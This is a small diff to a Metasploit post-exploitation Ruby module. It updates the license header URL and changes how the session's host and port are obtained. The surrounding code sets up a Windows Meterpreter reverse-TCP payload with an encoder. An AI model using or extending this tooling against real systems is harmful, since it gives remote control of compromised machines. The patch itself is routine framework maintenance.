@@ -5,8 +5,8 @@
 ##
 # ## This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -87,7 +87,7 @@ class Metasploit3 < Msf::Post
 		encoder = datastore['ENCODER']
 		iterations = datastore['ITERATIONS']
 		@clean_up_rc = ""
-		host,port = session.tunnel_peer.split(':')
+		host,port = session.session_host, session.session_port
 		payload = "windows/meterpreter/reverse_tcp"
 
 		if  datastore['ACTION'] == 'TEMPLATE'
